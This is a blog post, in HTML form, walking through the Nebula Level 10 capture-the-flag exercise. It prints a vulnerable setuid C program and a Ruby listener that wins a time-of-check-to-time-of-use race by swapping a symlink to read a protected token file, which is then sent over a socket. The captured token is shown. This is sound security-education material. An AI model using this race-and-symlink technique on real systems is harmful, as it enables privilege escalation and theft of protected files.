@@ -1,0 +1,468 @@
+
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<title>Exploit Exercises - Nebula Level 10 - Han</title>
+	<meta name="author" content="Zealoct">
+
+	
+	<meta name="description" content="Exploit Exercises - Nebula Level 10 2014年01月25日 Exercises, Nebula, Security About The setuid binary at /home/flag10/flag10 binary will upload any &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Han" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://hanjc.me/blog/2014/01/25/nebula-level10/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+  
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-48829613-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	
+	<img src="/images/profile.jpg" alt="Profile Picture" style="width: 160px;" />
+	<!--<img src="http://www.gravatar.com/avatar/?s=160" alt="Profile Picture" style="width: 160px;" />-->
+	
+</div>
+
+<nav id="main-nav"><ul class="main">
+    <li><a href="/">博客</a></li>
+	<li><a href="/blog/archives">列表视图</a></li>
+	<li><a href="/notes">笔记</a></li>
+    <li><a href="http://about.me/hanjc" target="_blank">关于我</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		
+		
+			<a class="twitter" href="http://twitter.com/zealoct" title="Twitter">Twitter</a>
+		
+		
+			<a class="github" href="https://github.com/zealoct" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+			<a class="rss" href="/atom.xml" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+<div id="banner" class="inner">
+	<div class="container">
+		<ul class="feed"></ul>
+	</div>
+	<small><a href="http://twitter.com/zealoct">zealoct</a> @ <a href="http://twitter.com">Twitter</a></small>
+	<div class="loading">Loading...</div>
+</div>
+<script src="/javascripts/twitter.js"></script>
+<script type="text/javascript">
+	(function($){
+		$('#banner').getTwitterFeed('zealoct', 5, );
+	})(jQuery);
+</script>
+
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Exploit Exercises - Nebula Level 10</h1>
+	<div class="meta">
+		<span class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-25T12:40:53+08:00" data-updated="true" itemprop="datePublished">2014年01月25日</time></span>
+		<span class="tags">
+
+
+	<a class='category' href='/blog/categories/exercises/'>Exercises</a>, <a class='category' href='/blog/categories/nebula/'>Nebula</a>, <a class='category' href='/blog/categories/security/'>Security</a>
+
+
+</span>
+	</div>
+	<div class="entry-content" itemprop="articleBody"><h3>About</h3>
+
+<p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>
+
+<p>To do this level, log in as the <em>level10</em> account with the password <em>level10</em>. Files for this level can be found in /home/flag10.</p>
+
+<h3>Source Code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="cp">#undef HITHERE</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'>      
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>There at two files in the directory /home/flag10, <em>flag10</em> and <em>token</em>. The source code of executable <em>flag10</em> in shown above, and <em>token</em> contains the password of user <em>flag10</em>. The goal is to read the content of <em>token</em>.</p>
+
+<p>The attack comes from a common bug called <a href="http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use">Time of check to time of use</a>, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:</p>
+
+<ol>
+<li>pass <em>/home/level10/token</em> whick links to a real user(<em>level10</em>) readable file <em>/home/level10/test</em> to the program as <code>argv[1]</code></li>
+<li><em>/home/flag10/flag10</em> checks whether this file is accessable at line 24(with the result true)</li>
+<li>modify the file to link to <em>/home/flag10/token</em> when <em>/home/flag10/flag10</em> is executing code between line 24 and line 54</li>
+<li>when <em>/home/flag10/flag10</em> reads the file at line 54, it reads <em>/home/flag10/token</em></li>
+</ol>
+
+
+<p>The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the <em>flag10</em> program will send a banner before actually read the file(line 46), this leaves me some time to make some change!</p>
+
+<p>Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file <em>/home/level10/token</em> immediately after the server accepts a connection from the client, I wrote this server code in Ruby:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">server</span> <span class="o">=</span> <span class="no">TCPServer</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">18211</span><span class="p">)</span>
+</span><span class='line'><span class="kp">loop</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span>
+</span><span class='line'>    <span class="sb">`rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`</span>
+</span><span class='line'>    <span class="k">while</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">gets</span>
+</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;RECV: </span><span class="si">#{</span><span class="n">msg</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>    <span class="k">end</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After the server was started, I triggered the vulnerability with the following command</p>
+
+<pre><code>$ /home/flag10/flag10 ~/token 127.0.0.1
+</code></pre>
+
+<p>Note that the symbolic file <em>~/token</em> must exist and point to a file that is readable by user <em>level10</em> before the program <em>flag10</em> is executed.</p>
+
+<p>The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level10@nebula:~<span class="nv">$ </span>ruby serv.rb
+</span><span class='line'>RECV: .oO Oo.
+</span><span class='line'>RECV: hello world
+</span><span class='line'>
+</span><span class='line'>level10@nebula:~<span class="nv">$ </span>ruby serv.rb
+</span><span class='line'>RECV: .oO Oo.
+</span><span class='line'>RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+</div>
+
+
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_renren"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_reddit"></a>
+	<a class="jiathis_button_twitter"></a>
+	<a class="jiathis_button_fb"></a>
+	<a class="jiathis_button_googleplus"></a>
+	<a class="jiathis_button_gmail"></a>
+	<a class="jiathis_button_douban"></a>
+	<a class="jiathis_button_tumblr"></a>
+	<a class="jiathis_button_yixin"></a>
+	<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+	var jiathis_config={
+summary:"",
+		shortUrl:false,
+		hideMore:false
+	}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!--  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script> -->
+</div>
+
+	
+	</br>
+    <p class="meta">
+      
+        <a class="basic-alignment left nextprev" href="/blog/2014/01/24/nebula-level09/" title="Previous Post: Exploit Exercises - Nebula Level 09">&laquo; Exploit Exercises - Nebula Level 09</a>
+      
+      
+        <a class="basic-alignment right nextprev" href="/blog/2014/01/26/nebula-level11/" title="Next Post: Exploit Exercises - Nebula Level 11">Exploit Exercises - Nebula Level 11 &raquo;</a>
+      
+    </p>
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner">Copyright &copy; 2014
+
+    Zealoct
+
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			
+
+<script type="text/javascript">
+      var disqus_shortname = 'hanjc';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://hanjc.me/blog/2014/01/25/nebula-level10/';
+        var disqus_url = 'http://hanjc.me/blog/2014/01/25/nebula-level10/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
